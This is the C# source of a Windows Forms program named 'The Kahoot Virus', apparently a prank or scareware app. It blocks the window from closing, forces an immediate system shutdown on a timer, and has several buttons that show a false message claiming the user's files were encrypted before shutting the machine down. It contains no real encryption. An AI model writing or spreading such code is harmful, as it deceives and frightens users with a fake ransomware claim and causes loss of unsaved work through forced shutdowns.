using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.Diagnostics;

namespace The_Kahoot_Virus
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            SoundPlayer player = new SoundPlayer();
            player.SoundLocation = "C:/Users/loisg/Downloads/The-20-Second-Answer-Medley.wav";
            player.Play();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("shutdown", "/s /t 0");
        }

        private void button3_Click(object sender, EventArgs e)
        {
            MessageBox.Show("It wasn't this button, all your files were encrypted properly", "ENCRYPTING...", MessageBoxButtons.OK, MessageBoxIcon.Error);
            System.Diagnostics.Process.Start("shutdown", "/s /t 0");
        }

        private void button5_Click(object sender, EventArgs e)
        {
            MessageBox.Show("It wasn't this button, all your files were encrypted properly", "ENCRYPTING...", MessageBoxButtons.OK, MessageBoxIcon.Error);
            System.Diagnostics.Process.Start("shutdown", "/s /t 0");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("It wasn't this button, all your files were encrypted properly", "ENCRYPTING...", MessageBoxButtons.OK, MessageBoxIcon.Error);
            System.Diagnostics.Process.Start("shutdown", "/s /t 0");
        }

        private void button4_Click(object sender, EventArgs e)
        {
            MessageBox.Show("It wasn't this button, all your files were encrypted properly", "ENCRYPTING...", MessageBoxButtons.OK, MessageBoxIcon.Error);
            System.Diagnostics.Process.Start("shutdown", "/s /t 0");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            new Form2().Show();
            this.Hide();
        }
    }
}
